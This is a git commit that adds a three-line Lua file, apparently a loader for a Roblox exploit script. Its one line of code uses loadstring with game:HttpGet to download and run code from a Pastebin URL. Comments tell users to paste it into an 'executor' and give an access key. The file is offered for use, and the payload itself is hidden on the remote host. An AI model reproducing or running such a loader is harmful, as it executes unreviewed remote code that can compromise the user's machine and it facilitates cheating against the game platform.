50153c6c5a63c11a046df687f84322c881e1d441
ch4dlovespizza64 <104768978+ch4dlovespizza64@users.noreply.github.com>
2022-12-22 16:58:57 +0800

    Create Main.lua

---
+++ Main.lua
@@ -0,0 +1,3 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/0v73Y1h9"))() -- Copy this code and paste it to your executor
+-- Key: iloveparties60s
+-- Made by ch4dlovespizza aka RTLua1 or random king on YT
